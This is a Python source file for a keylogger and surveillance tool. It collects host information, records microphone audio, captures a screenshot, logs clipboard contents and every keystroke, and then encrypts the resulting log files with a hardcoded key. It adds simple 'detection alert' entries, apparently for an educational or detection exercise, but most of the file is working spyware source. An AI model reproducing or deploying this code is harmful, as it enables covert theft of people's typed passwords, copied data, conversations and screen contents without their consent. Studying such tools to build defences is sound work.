import os
import platform
import socket
import time
import threading
import pyperclip
import psutil
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet

# ========================
# Configuration
# ========================
file_path = os.path.expanduser("~/Desktop/")  # Save path (e.g., Desktop)
keys_info = "key_log.txt"
system_info = "syseminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
detection_log = "alerts.txt"

# Fernet encryption key (generated by GenerateKey.py)
key = b"_kI7F7IqMVb956KR3WQ3wJ4nSky-AsDE5eQW59ZILnI="

# ========================
# Collect system information
# ========================
def system_information():
    with open(file_path + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        f.write("Processor Info: " + platform.processor() + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write(f"CPU Usage: {psutil.cpu_percent(interval=0.1)}%\n")
        f.write(f"Memory Usage: {psutil.virtual_memory().percent}%\n")

system_information()

# ========================
# Audio recording
# ========================
def microphone():
    fs = 44100
    seconds = 10  # recording duration
    print("Recording audio...")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    write(file_path + audio_info, fs, myrecording)
    print("Audio saved:", file_path + audio_info)
    # Detection alert for microphone usage
    with open(file_path + detection_log, "a") as f:
        f.write(f"ALERT: Microphone recording event at {time.ctime()}\n")

microphone()

# ========================
# Screenshot capture
# ========================
def screenshot():
    print("Taking screenshot...")
    im = ImageGrab.grab()
    im.save(file_path + screenshot_info)
    print("Screenshot saved:", file_path + screenshot_info)
    # Detection alert for screenshot usage
    with open(file_path + detection_log, "a") as f:
        f.write(f"ALERT: Screenshot capture event at {time.ctime()}\n")

screenshot()

# ========================
# Clipboard monitoring (background thread)
# ========================
running = True
clipboard_access_count = 0

def clipboard_monitor():
    global clipboard_access_count
    last_text = ""
    while running:
        text = pyperclip.paste()
        if text and text != last_text:
            # Log clipboard content
            with open(file_path + clipboard_info, "a") as f:
                f.write("Clipboard Copied: " + text + "\n")
            last_text = text
            clipboard_access_count += 1
            # Detection alert on first clipboard access
            if clipboard_access_count == 1:
                with open(file_path + detection_log, "a") as f:
                    f.write(f"ALERT: Clipboard content accessed at {time.ctime()}\n")
        time.sleep(5)

# Start clipboard monitoring thread
clip_thread = threading.Thread(target=clipboard_monitor, daemon=True)
clip_thread.start()

# ========================
# Keystroke logging (keyboard listener)
# ========================
keys = []
key_count = 0
key_start_time = None

def write_keys_to_file(keys):
    with open(file_path + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global key_count, key_start_time
    # Log key to file
    keys.append(key)
    if len(keys) >= 1:
        write_keys_to_file(keys)
        keys.clear()
    # Update key press count and detection
    if key_start_time is None:
        key_start_time = time.time()
    key_count += 1
    # Reset window if more than 60 seconds have passed
    if time.time() - key_start_time > 60:
        key_count = 1
        key_start_time = time.time()
    # Check for high keystroke frequency
    elif key_count >= 100 and time.time() - key_start_time <= 60:
        with open(file_path + detection_log, "a") as f:
            f.write(f"ALERT: High keystroke frequency detected at {time.ctime()}\n")
        # Reset count after alert
        key_count = 0
        key_start_time = None

def on_release(key):
    if key == Key.esc:
        # Stop listener on ESC key
        return False

print("Start keylogger... (press ESC to stop)")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Stop clipboard monitoring after keylogger ends
running = False
clip_thread.join(timeout=1)

# ========================
# Encrypt log files
# ========================
def encrypt_file(src, dst):
    with open(src, "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(dst, "wb") as f:
        f.write(encrypted)

# Files to encrypt
files_to_encrypt = [
    file_path + system_info,
    file_path + keys_info,
    file_path + clipboard_info,
    file_path + audio_info,
    file_path + screenshot_info,
]

for f_name in files_to_encrypt:
    if os.path.exists(f_name):
        encrypt_file(f_name, f_name + ".enc")
        print("Encrypted:", f_name, "->", f_name + ".enc")
    else:
        print("File not found, skipped:", f_name)

print("All done! Logs saved on Desktop.")
